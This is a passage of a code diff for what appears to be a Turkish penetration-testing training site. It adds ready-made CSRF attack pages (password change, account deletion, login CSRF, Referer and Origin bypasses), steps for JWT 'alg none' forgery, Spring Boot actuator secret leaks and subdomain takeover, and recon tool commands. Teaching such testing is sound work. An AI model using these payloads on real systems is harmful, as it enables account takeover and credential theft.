yanlış ayarlanmışsa çalışır\nfetch('https://victim.com/api/delete_user?id=123', {\n  method: 'GET',\n  mode: 'cors',\n  credentials: 'include' \n});\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Eğer API, CORS ayarlarını <code>Access-Control-Allow-Credentials: true</code> ve <code>Access-Control-Allow-Origin: *</code> olarak ayarlamışsa<br>(bkz: 4. Bölüm, CORS CSRF), bu senaryo, klasik CSRF korumalarını atlayarak doğrudan kurbanın oturumuyla XHR isteği gönderir.</div></div></details></li>\n\t\t\t\t"
+            "content": "<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 1 - Temel Token Eksikliği (POST)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu, kritik bir POST isteğinde CSRF token kontrolü yapmıyor.<br><div style='margin-top:10px;'><strong>Orijinal İstek:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /user/change_email HTTP/1.1\nCookie: session=abc...\n\nemail=hacker@mail.com&csrf_token=XXX</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/user/change_email\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"hacker@mail.com\" /&gt;\n      &lt;!-- Token KALDIRILDI --&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 2 - Token Kısıtlaması Yok</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu, gönderilen tokenın oturum çerezi ile ilişkilendirilip ilişkilendirilmediğini (yani tokenın kurbana ait olup olmadığını) kontrol etmiyor.<br><div style='margin-top:10px;'><strong>Saldırı Adımları:</strong><br>1. Saldırgan, kendi hesabına giriş yapar ve kendi <code>csrf_token</code> değerini kaydeder. (Örn: <code>hacker_token</code>)<br>2. Saldırgan, bu <code>hacker_token</code> değerini kurbanı hedef alan PoC formuna yerleştirir.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/change_pass\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"new_password\" value=\"hacked123\" /&gt;\n      &lt;!-- Token olarak saldırganın tokenı kullanılıyor --&gt;\n      &lt;input type=\"hidden\" name=\"csrf_token\" value=\"hacker_token\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 3 - Referer Başlık Kontrolü Bypass</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu <code>Referer</code> başlığında sadece ana domainin (<code>victim.com</code>) geçip geçmediğini kontrol ediyor, subdomainleri dikkate almıyor.<br><div style='margin-top:10px;'><strong>Saldırgan Yöntemi:</strong> <code>https://victim.com.hacker.com/exploit.html</code> veya <code>https://hacker.com/exploit.html?referrer=https://victim.com</code> gibi teknikler denenir.<br>Bu örnekte, <code>.victim.com</code> tekniğini kullanalım. Saldırgan, <code>victim.com</code> ile biten bir subdomain oluşturur: <code>https://hacker-site.victim.com/poc.html</code></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Adresi:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>https://hacker-site.victim.com/poc.html</pre><strong style='margin-top:10px;display:block;'>Sonuç:</strong><div style='margin-top:5px;'>Sunucu <code>Referer</code> başlığına bakar ve <code>hacker-site.victim.com</code> adresini <code>victim.com</code>'a ait olarak yanlış yorumlayabilir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 4 - Zafiyetli Metot Kullanımı (GET ile Hesap Silme)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Kritik bir 'state-changing' işlem (hesap silme) için <code>POST</code> yerine <code>GET</code> metodu kullanılıyor. Bu, bir <code>&lt;img&gt;</code> veya <code>&lt;a&gt;</code> etiketi ile sömürülebilir.<br><div style='margin-top:10px;'><strong>Orijinal İstek:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>GET /user/delete?id=123&confirm=true HTTP/1.1\nCookie: session=abc...</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu (En Basit Yöntem):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;img src=\"https://victim.com/user/delete?id=123&confirm=true\" style=\"display:none\"&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Kurbanın tarayıcısı, resmi yüklemeye çalışırken oturum çerezlerini de göndererek hesap silme isteğini tetikler.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 5 - JSON CSRF (text/plain Yöntemi)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> API, <code>application/json</code> yerine <code>text/plain</code> olarak gönderilen JSON verilerini kabul ediyor ve <code>X-Requested-With</code> kontrolü yok.<br><div style='margin-top:10px;'><strong>Orijinal İstek (JSON):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /api/settings HTTP/1.1\nContent-Type: application/json\n\n{\"username\":\"new_name\"}</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;form action=\"https://victim.com/api/settings\" method=\"POST\" enctype=\"text/plain\"&gt;\n  &lt;input type=\"hidden\" name='{\"username\":\"hacked\"}' value='\"}' /&gt;\n  &lt;!-- Tarayıcı payload'ı şu şekilde kodlar: {'username':'hacked'}='}' --&gt;\n&lt;/form&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Sunucu eğer akıllıca ayrıştırma yapmazsa, form verisini, geçerli bir JSON payload'ı olarak yorumlayabilir.</div></div></details></li>\n\n<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 6 - Double Submit Cookie CSRF Bypass</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Uygulama, isteğin gövdesindeki/başlığındaki token ile çerezdeki tokenı eşleştirir. Ancak tokenı tekrar oluşturma (set etme) fonksiyonu zafiyetlidir.<br><div style='margin-top:10px;'><strong>Saldırı Adımları:</strong><br>1. Saldırgan, kendi CSRF tokenını çerez olarak kurbana enjekte eder (Örn: XSS, XSS olmayan bir domainde zafiyetli bir çerez koyma, vb.).<br>2. Saldırgan, bu enjekte ettiği token değerini (Örn: <code>hacker_cookie_token</code>) PoC formuna koyar.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;!-- Daha önce XSS ile 'csrf_token' çerezi enjekte edilmiş varsayılır --&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/update_info\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"data\" value=\"hacked_data\" /&gt;\n      &lt;!-- Formdaki token, çerezdeki enjekte edilen token ile eşleşir --&gt;\n      &lt;input type=\"hidden\" name=\"csrf_token\" value=\"hacker_cookie_token\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 7 - Origin Kontrolü Bypass (Null Byte veya Port Kullanımı)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu <code>Origin</code> başlığını regex ile kontrol ederken sonundaki port numarasını veya dizenin sonunu tam olarak kontrol etmez.<br><div style='margin-top:10px;'><strong>Saldırı Yöntemleri:</strong><br>1. Port Bypass: Saldırgan, <code>https://victim.com:8080.hacker.com</code> gibi bir URL kullanır. (Çoğu tarayıcı <code>Origin</code>'i sadece <code>https://victim.com</code> olarak gönderir, ancak bazı sunucular yanlış kontrol edebilir.)<br>2. Boş Byte: <code>Referer</code> veya <code>Origin</code> başlığına Null Byte (<code>%00</code>) eklenerek regex kontrolünün yanlış sonuç vermesi sağlanır.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) İsteği (Boş Byte Örneği):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /admin/action HTTP/1.1\nOrigin: https://victim.com%00.hacker.com</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Sunucunun regex'i <code>victim.com</code>'dan sonraki kısmı kontrol etmezse veya <code>%00</code>'da keserse bypass gerçekleşir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 8 - Güvenli Olmayan HTML Tag'leri ile GET CSRF</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Kritik işlem <code>GET</code> metoduyla yapılıyor ve <code>Referer</code>/<code>Origin</code> kontrolü yok. <br><div style='margin-top:10px;'><strong>PoC İçin Kullanılabilecek Diğer Tag'ler:</strong><br>1. &lt;script src='...'&gt;: (API'lerde, yanıt tipi JS ise ve side-effect yaratıyorsa kullanılır.)<br>2. &lt;link href='...'&gt;: (Bazı tarayıcılar tarafından prefetch/prerender amacıyla tetiklenebilir.)<br>3. &lt;iframe src='...'&gt;: (Eski tarayıcılarda veya özel konfigürasyonlarda tetiklenebilir.)</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu (AJAX/Fetch Kullanımı):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n// API çerezleri ile kimlik doğrulaması yapıyorsa ve CORS yanlış ayarlanmışsa çalışır\nfetch('https://victim.com/api/delete_user?id=123', {\n  method: 'GET',\n  mode: 'cors',\n  credentials: 'include' \n});\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Eğer API, CORS ayarlarını <code>Access-Control-Allow-Credentials: true</code> ve <code>Access-Control-Allow-Origin: *</code> olarak ayarlamışsa<br>(bkz: 4. Bölüm, CORS CSRF), bu senaryo, klasik CSRF korumalarını atlayarak doğrudan kurbanın oturumuyla XHR isteği gönderir.</div></div></details></li>\n\n<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 9 - Login CSRF (Oturum Bindirme)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> <code>/login</code> endpoint'inde CSRF koruması yoktur. Saldırgan, kurbanı <em>kendi (saldırganın)</em> hesabına giriş yapmaya zorlar.<br><div style='margin-top:10px;'><strong>Neden Tehlikeli?</strong><ul style='padding-left:20px;margin:5px 0;'><li>Kurban, siteye girdiğini sanır ama aslında saldırganın hesabındadır.</li><li>Kurbanın girdiği kredi kartı bilgileri, arama geçmişi veya yüklediği dosyalar saldırganın hesabına kaydedilir.</li></ul></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/login\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"user\" value=\"hacker\" /&gt;\n      &lt;input type=\"hidden\" name=\"pass\" value=\"hacker123\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 10 - Referer \"Fail Open\" (Meta Tag Trick)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sistem, Referer başlığı <em>varsa</em> domaini kontrol eder, ancak Referer başlığı <em>hiç yoksa</em> (null/empty) isteğe güvenip izin verir (Fail Open).<br><div style='margin-top:10px;'><strong>Saldırı Yöntemi:</strong> Saldırgan, PoC sayfasına bir <code>meta</code> etiketi ekleyerek tarayıcının Referer başlığı göndermesini engeller.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;head&gt;\n    &lt;!-- Bu meta tag, tarayıcının Referer başlığını silmesini sağlar --&gt;\n    &lt;meta name=\"referrer\" content=\"no-referrer\"&gt;\n  &lt;/head&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/delete_account\" method=\"POST\"&gt;\n      &lt;!-- Parametreler --&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre><strong style='margin-top:10px;display:block;'>Sonuç:</strong><div style='margin-top:5px;'>Sunucu \"Referer başlığı yok, demek ki güvenli (örneğin bookmark'tan gelmiş)\" diye düşünür ve saldırıyı kabul eder.</div></div></details></li>\n\t\t\t\t"
           }
         ]
       },
@@ -2071,7 +2081,7 @@ Password: anything</pre>
 
       informationDisclosure: {
         menuName: 'Information Disclosure',
-        icon: 'icon-external-link',
+        icon: 'icon-enumeration',
         parent: 'vulnerabilities',
         title: 'Information Disclosure (Bilgi Sızıntısı)',
         description: 'Hedef sistemlerde bilgi sızıntılarını tespit etmek ve kritik dosyaları keşfetmek için adım adım uygulamalı rehber ve teorik bilgiler.',
@@ -2371,7 +2381,7 @@ Body: { "email": "victim@target.com" }</pre>
 
       clickjacking: {
         menuName: 'Clickjacking',
-        icon: 'icon-clickjacking',
+        icon: 'icon-external-link',
         parent: 'vulnerabilities',
         title: 'Clickjacking (UI Redressing) Zafiyeti',
         description: 'Kullanıcının kritik bir işlemi, aldatıcı bir arayüz arkasına gizlenmiş görünmez bir iframe üzerinden gerçekleştirmesini sağlama tekniği.',
@@ -2528,7 +2538,7 @@ Body: { "email": "victim@target.com" }</pre>
         menuName: "Misconfiguration",
         icon: "icon-toolbox",
         parent: "vulnerabilities",
-        title: "Security Misconfiguration (Kapsamlı Test Rehberi)",
+        title: "Security Misconfiguration (Güvenlik Yapılandırma Hatası)",
         description: "Sunucu, dosya, HTTP başlıkları (CORS, Cookies) ve varsayılan ayarlar gibi bileşenlerin güvensiz yapılandırılmasını test etme metodolojisi.",
         sections: [
           {
@@ -2929,6 +2939,70 @@ Cookie: session=...; isAdmin=true;</pre>
     </details>
   </li>
 
+<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 18: Spring Boot Actuators (Bilgi İfşası & RCE)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Java Spring Boot uygulamalarında, geliştiricilerin prod ortamında açık unuttuğu <code>/actuator</code> endpointlerini bularak kritik verileri (env değişkenleri, sessionlar) çekmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Hedef sitenin sonuna şu yolları ekleyerek <strong>Burp Repeater</strong> ile GET isteği atın:</p>
+        <pre style='margin-bottom: 20px;'>/actuator
+/actuator/env  (En Kritiği!)
+/actuator/heapdump
+/actuator/mappings</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'><code>/actuator/env</code> endpointi <code>200 OK</code> dönerse, AWS keyleri ve DB şifreleri ifşa olur. <code>/heapdump</code> dönerse, bellek dökümünü indirip içinde session token veya şifre arayabilirsiniz.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 19: JWT Misconfiguration (None Algorithm)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>JWT kütüphanesinin, imzasız (imza bölümü olmayan) tokenları kabul edecek şekilde yanlış yapılandırılıp yapılandırılmadığını test etmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <ol class='small' style='padding-left:20px;margin:5px 0; margin-bottom: 20px;'>
+          <li>Mevcut JWT tokenınızı <a href='https://jwt.io' target='_blank' style='color:var(--accent);text-decoration:none;'>jwt.io</a> veya Burp JWT Editor'e alın.</li>
+          <li>Header kısmındaki <code>"alg": "HS256"</code> değerini <code>"alg": "none"</code> yapın (Bazen <code>None</code> da çalışır).</li>
+          <li>Payload kısmındaki veriyi yükseltin (örn: <code>"role": "admin"</code>).</li>
+          <li><strong>Önemli:</strong> Tokenın sonundaki imza kısmını silin ama noktayı (<code>.</code>) bırakın (<code>eyJ...Payload.</code>).</li>
+        </ol>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucunun bu sahte ve imzasız tokenı kabul edip size admin yetkisi (veya <code>200 OK</code>) vermesi.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 20: Subdomain Takeover (Dangling DNS)</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Şirketin artık kullanmadığı ancak DNS kayıtlarında (CNAME) hala yönlendirdiği "boşa çıkmış" subdomainleri tespit edip ele geçirmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'><code>subfinder</code> ile subdomainleri bulun, <code>nuclei</code> veya <code>subjack</code> ile CNAME hatalarını tarayın:</p>
+        <pre style='margin-bottom: 20px;'>CNAME: blog.hedef.com -> sirket-blog.github.io
+(Hata: 404 Not Found - There isn't a GitHub Pages site here)</pre>
+        <p class='small' style='margin:0 0 20px 0;'>GitHub'a gidip <code>sirket-blog</code> adıyla bir repo/page oluşturmayı deneyin.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Durum:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Kendi oluşturduğunuz sayfanın <code>blog.hedef.com</code> üzerinde yayınlanması. Bu sayede o domain üzerinden XSS yapabilir veya cookie çalabilirsiniz.</p>
+      </div>
+    </details>
+  </li>
+
+
+
+
+
 </ul>
 `
           }
@@ -2972,7 +3046,7 @@ Cookie: session=...; isAdmin=true;</pre>
 
       unrestricted_file_upload: {
         menuName: 'RCE / File Upload',
-        icon: 'icon-bomb',
+        icon: 'icon-exploitation',
         parent: 'vulnerabilities',
         title: 'RCE - Remote Code Execution (Uzaktan Kod Çalıştırma)',
         description: 'Komut enjeksiyonu, dosya yükleme veya zincirleme zafiyetler yoluyla hedef sistemde kod çalıştırma teknikleri.',
@@ -3207,6 +3281,16 @@ POST /api/users/update
           },
 
           {
+            title: 'Param Miner (Burp Extension)',
+            content: `
+        <div style="display:flex;align-items:center;gap:8px">
+          <pre style="margin:0;white-space:pre-wrap"># BApp Store üzerinden kurulur, arka planda gizli header ve parametreleri tahmin eder.</pre>
+        </div>
+        <div style="margin-top:6px;font-size:13px;color:var(--muted)">Bu eklenti: gezilen sayfalarda gizli parametreleri (headers/cookies) tahmin ederek sızıntıları ve cache poisoning zafiyetlerini yakalar.</div>
+        `
+          },
+
+          {
             title: 'sqlmap',
             content: `
         <div style="display:flex;align-items:center;gap:8px">
@@ -3372,7 +3456,7 @@ POST /api/users/update
           },
 
           {
-            title: 'ffuf',
+            title: 'Ffuf',
             content: `
         <div style="display:flex;align-items:center;gap:8px">
           <pre style="margin:0;white-space:pre-wrap">ffuf -u http://TARGET_IP/FUZZ -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt</pre>
@@ -3381,6 +3465,17 @@ POST /api/users/update
         </div>
         <div style="margin-top:6px;font-size:13px;color:var(--muted)">Bu komut: hızlı içerik fuzzing ve virtual-host keşfi (vhost probing) için kullanılır.</div>
         `
+          },
+
+          {
+            title: 'Arjun',
+            content: `
+            <div style="display:flex;align-items:center;gap:8px">
+              <pre style="margin:0;white-space:pre-wrap">arjun -u https://target.com/index.php -w top-parameters.txt</pre>
+              <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6" onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
+            </div>
+            <div style="margin-top:6px;font-size:13px;color:var(--muted)">HTTP isteklerindeki gizli parametreleri bulan popüler bir Python aracıdır.</div>
+            `
           },
 
           {
@@ -3952,7 +4047,7 @@ POST /api/users/update
       });
     }
 
-    function showPage(pageId) {
+function showPage(pageId) {
       document.querySelectorAll('[data-page]').forEach(el => el.classList.remove('active'));
       const activeEl = document.querySelector(`[data-page="${pageId}"]`);
       if (activeEl) {
@@ -3975,26 +4070,22 @@ POST /api/users/update
             <div id="searchSuggestions" class="search-suggestions" role="listbox" aria-label="Arama önerileri" hidden></div>
         </div>
         
-        <div class="hero" style="background: linear-gradient(135deg, rgba(1, 1, 1, 0.2), rgba(124, 58, 237, 0.2)); border: 1px solid var(); padding: 40px; margin-bottom: 30px;">
+        <div class="hero" style="background: linear-gradient(135deg, rgba(1, 1, 1, 0.2), rgba(124, 58, 237, 0.2)); border: 1px solid rgba(255,255,255,0.05); padding: 40px; margin-bottom: 30px;">
         <h1 style="
             font-size: 38px;
             margin-bottom: 12px;
             font-family: monospace;
-            
             background: linear-gradient(180deg, #b38cff, #8f5fe8);
             -webkit-background-clip: text;
             color: transparent;
             -webkit-text-fill-color: transparent;
-
-            text-shadow:
-                0 0 6px rgba(179, 140, 255, 0.4),
-                0 0 12px rgba(143, 95, 232, 0.25);
+            text-shadow: 0 0 6px rgba(179, 140, 255, 0.4), 0 0 12px rgba(143, 95, 232, 0.25);
         ">
             &gt; DARK_SECURITY_INIT: SUCCESS
         </h1>
 
             <p class="subtitle" style="font-size: 17px; color: #cbd5e1; line-height: 1.6; font-family: monospace;">
-                [INFO] >> Gerçek dünya senaryoları - Pratik Araçlar - Zafiyet Analizi! <<<br>[WARNING] Yalnızca yetkiniz olan Hedeflerde test yapın!"
+                [INFO] >> Gerçek dünya senaryoları - Pratik Araçlar - Zafiyet Analizi! <<<br>[WARNING] Yalnızca yetkiniz olan hedeflerde test yapın!"
             </p>
         </div>
 
@@ -4003,19 +4094,19 @@ POST /api/users/update
             <div style="display: flex; flex-direction: column; gap: 15px;">
                 <h2 style="font-size: 20px; color: #dddddd; border-bottom: 1px solid var(--glass); padding-bottom: 8px;">ATTACK FLOW (Saldırı Aşaması)</h2>
                 
-                ${generateFlowCard('icon-search', 'RECON & KEŞİF', 'javascriptrecon', 'Subdomain, endpoint ve eski URL\'leri toplayarak saldırı yüzeyini genişlet.', '#8b5cf6')}
-                ${generateFlowCard('icon-file-export', 'ENDPOINT VURGUSU', 'informationDisclosure', 'Gömülü anahtarlar, debug panelleri ve hassas veri sızıntılarını sömür.', '#8b5cf6')}
-                ${generateFlowCard('icon-code', 'İSTİSMAR (EXPLOIT)', 'xss', 'API/web katmanında SQLi, XSS, SSRF ve RCE tekniklerini uygula.', '#8b5cf6')}
-                ${generateFlowCard('icon-user-slash', 'YETKİ YÜKSELTME', 'privilege_escalation', 'Kullanıcı/Admin rollerinde dikey ve yatay yetki atlatma tekniklerini kullan.', '#8b5cf6')}
+                ${generateFlowCard('icon-ghost', '1. RECONNAISSANCE (Keşif)', 'javascriptrecon', 'Hedefin dijital ayak izini çıkar: Subdomain, IP ve teknoloji tespiti.', '#8b5cf6')}
+                ${generateFlowCard('icon-terminal', '2. ENUMERATION (Tarama)', 'toolbox', 'Port tarama, dizin keşfi ve parametre analizi araçlarını kullan.', '#8b5cf6')}
+                ${generateFlowCard('icon-exploitation', '3. EXPLOITATION (Sömürü)', 'unrestricted_file_upload', 'Tespit edilen zafiyetleri (RCE, Shell Upload) kullanarak sisteme sız.', '#8b5cf6')}
+                ${generateFlowCard('icon-user-slash', '4. POST-EXPLOITATION', 'privilege_escalation', 'Yetki yükseltme (PrivEsc) ve yanal hareket ile tam kontrol sağla.', '#8b5cf6')}
             </div>
             
             <div style="display: flex; flex-direction: column; gap: 15px;">
                 <h2 style="font-size: 20px; color: #dddddd; border-bottom: 1px solid var(--glass); padding-bottom: 8px;">CRITICAL TARGETS (Kritik Hedefler)</h2>
                 
-                ${generateTargetCard('icon-database', 'SQL Injection Adayları', 'sqli', 'Formlar, API JSON gövdeleri ve her türlü GET/POST parametresi.')}
-                ${generateTargetCard('icon-key', 'IDOR & Yetkilendirme', 'idor', 'Sıralı ID\'ler, Base64 ID\'ler ve UUID ile referans verilen tüm nesneler.')}
-                ${generateTargetCard('icon-globe', 'SSRF Vektörleri', 'ssrf', 'Image URL, PDF render, webhook ve sunucu taraflı API çağrıları.')}
-                ${generateTargetCard('icon-folder-open', 'RCE Potansiyeli', 'unrestricted_file_upload', 'Dosya yükleme noktaları, LFI/RFI ve log poisoning yolları.')}
+                ${generateTargetCard('icon-bug', 'Cross-Site Scripting (XSS)', 'xss', 'Stored, Reflected ve DOM XSS ile kullanıcı oturumlarını hedefle.')}
+                ${generateTargetCard('icon-secret-eye', 'Information Disclosure', 'informationDisclosure', 'API anahtarları, yedek dosyalar ve debug bilgilerini ifşa et.')}
+                ${generateTargetCard('icon-toolbox', 'Security Misconfiguration', 'misconfig', 'Varsayılan ayarlar, CORS hataları ve eksik güvenlik başlıkları.')}
+                ${generateTargetCard('icon-refresh', 'CSRF Attacks', 'csrf', 'State-changing işlemleri manipüle ederek izinsiz aksiyon al.')}
             </div>
         </div>
         
@@ -4023,7 +4114,6 @@ POST /api/users/update
             <span style="text-align: right;">© 2025 Dark Security &lt;/&gt; Eğitim amaçlı içeriktir.</span>
         </div>
     `;
-
 
         function generateFlowCard(icon, title, pageKey, desc, color) {
           return `<div class="card" data-page="${pageKey}" onclick="showPage('${pageKey}')" style="border-left: 3px solid ${color}; cursor: pointer; display: flex; align-items: center; justify-content: space-between; padding: 15px;">
@@ -4037,84 +4127,91 @@ POST /api/users/update
 
         function generateTargetCard(iconClass, title, pageKey, desc) {
           return `<div class="card" data-page="${pageKey}" onclick="showPage('${pageKey}')" style="border-left: 3px solid var(--accent); cursor: pointer; display: flex; align-items: center; padding: 15px;">
-            <span class="quick-link-icon ${iconClass}" style="color: var(--accent); background-color: rgba(6,182,212,0.1); margin-right: 15px;"></span>
+            <span class="quick-link-icon ${iconClass}" style="color: var(--accent); background-color: transparent; margin-right: 15px;"></span>
             <div style="display: flex; flex-direction: column;">
                 <h3 class="tool-title" style="margin-bottom: 4px;">${title}</h3>
                 <p class="tool-description" style="margin: 0; font-size: 12px;">${desc}</p>
             </div>
         </div>`;
         }
-        const container1 = document.querySelector('.hero').nextElementSibling.nextElementSibling.nextElementSibling;
 
+        // Tıklama olaylarını yeniden bağla
+        const container1 = document.querySelector('.hero').nextElementSibling.nextElementSibling.nextElementSibling;
         if (container1) {
           document.querySelectorAll('div[data-page]').forEach(el => {
